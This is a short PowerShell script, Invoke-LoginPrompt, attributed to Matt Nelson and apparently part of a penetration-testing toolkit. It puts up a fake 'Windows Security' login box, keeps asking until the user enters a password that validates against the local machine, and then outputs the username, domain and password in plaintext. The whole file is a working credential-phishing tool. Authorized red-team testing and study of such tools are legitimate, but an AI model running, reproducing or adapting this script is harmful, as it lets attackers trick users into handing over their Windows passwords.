<#
.SYNOPSIS
Standalone Powershell script that will promp the current user for a valid credentials.

Author: Matt Nelson (@enigma0x3)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION
This script will pop a Windows Authentication box and ask the user for credentials. It will then validate those credentials and continue to ask until proper credentials are supplied.

.LINK
http://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/
#>

function Invoke-LoginPrompt{
    $InitialPrompt = "Please enter user credentials"
    $RetryPrompt = "Invalid credentials. Please try again"
    do {
        $cred = $Host.ui.PromptForCredential("Windows Security", $(If ($cred) {$RetryPrompt} Else {$InitialPrompt}), "$env:userdomain\$env:username","")
        $username = "$env:username"
        $domain = "$env:userdomain"
        $full = "$domain" + "\" + "$username"
        $password = $cred.GetNetworkCredential().password
        Add-Type -assemblyname System.DirectoryServices.AccountManagement
        $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    } while($DS.ValidateCredentials("$full", "$password") -ne $True)
    
     $output = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
     $output
}
